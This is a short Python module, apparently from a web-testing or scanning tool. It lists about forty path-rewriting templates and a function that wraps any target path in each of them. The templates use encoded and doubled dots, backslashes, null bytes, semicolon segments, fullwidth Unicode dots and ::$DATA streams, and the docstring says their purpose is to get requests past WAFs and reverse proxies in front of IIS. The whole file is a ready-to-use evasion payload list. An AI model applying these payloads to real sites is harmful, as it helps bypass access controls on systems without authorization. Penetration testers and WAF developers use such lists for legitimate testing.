"""Whole-path normalization / WAF-evasion wrappers.

Unlike ``traversal.py`` (classic dot-dot-slash escapes appended after the
path) these rewrite the *entire* path with encoding and separator tricks
that some reverse proxies / WAFs normalize differently than IIS itself,
occasionally letting a request through where the plain path would be
blocked.
"""

ENCODING_TRICK_TEMPLATES = [
    "/{path}", "//{path}", "/./{path}", "..//{path}", "/.../{path}",
    "..../{path}", "%2e/{path}", "%2e%2e/{path}", "\\{path}", "%5c{path}",
    "/..;/{path}", "..;/{path}", ";/{path}", ".//{path}", "/{path}//",
    "/{path}/./", "/{path}/../", "/{path}%20", "/{path}%09", "/{path}?",
    "/{path}#", "/{path}%00", "/{path}..", "/{path}..;/", "/{path};/",
    "/{path}^/", "/.{path}", "/~{path}", "/*/{path}", "/./{path}./",
    "{path}%2e{path}", "/..../{path}", "..../{path}/", "%252e%252e/{path}",
    "/%uff0e/{path}", "%uff0e%uff0e/{path}", "///{path}", "/.//{path}",
    "/{path}:", "/{path}::$DATA", "/:{path}",
]


def build_encoding_trick_paths(path: str) -> list[str]:
    clean = path.strip("/")
    return [tpl.format(path=clean) for tpl in ENCODING_TRICK_TEMPLATES]
